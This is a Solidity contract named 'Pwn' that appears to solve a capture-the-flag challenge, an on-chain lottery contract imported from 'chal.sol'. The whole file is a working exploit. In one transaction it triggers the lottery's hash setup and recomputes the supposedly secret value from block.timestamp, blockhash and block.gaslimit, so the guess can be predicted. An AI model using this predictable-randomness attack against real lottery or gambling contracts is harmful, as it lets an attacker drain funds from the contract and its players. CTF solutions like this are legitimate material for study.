// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;
import "./chal.sol";


contract Pwn {
    onChainLotterySecuredx20000 factory;
    uint256 public val;

    constructor (onChainLotterySecuredx20000 _factory)
    {
        factory = onChainLotterySecuredx20000(address(_factory));
    }

    function setupMaHash() public
    {
        factory.setupMaHash();
        uint256 shuffler = block.timestamp % 25;
        val = uint256(blockhash(block.number - shuffler)) % block.gaslimit + 123285;
    }

    function trynaGuessMyhash(uint256 _val) public
    {
        factory.trynaGuessMyhash(_val);
    }

}